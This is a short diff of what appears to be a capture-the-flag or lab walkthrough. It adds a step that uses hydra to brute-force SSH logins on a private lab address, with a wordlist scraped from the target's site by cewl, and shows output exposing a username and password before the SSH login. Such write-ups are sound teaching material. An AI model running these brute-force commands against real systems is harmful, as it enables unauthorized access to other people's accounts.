@@ -72,6 +72,15 @@ $ cewl http://$ip/ | tee wordlist.txt
 ```
 
 ```
+$ hydra -L wordlist.txt -P wordlist.txt $ip ssh
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2601 login tries (l:51/p:51), ~163 tries per task
+[DATA] attacking ssh://192.168.1.101:22/
+[STATUS] 312.00 tries/min, 312 tries in 00:01h, 2291 to do in 00:08h, 16 active
+[22][ssh] host: 192.168.1.101   login: johannes   password: constelaciones
+```
+
+```
 $ ssh johannes@$ip                                                                                                                                                               255 ↵
 johannes@192.168.1.101's password: 
 
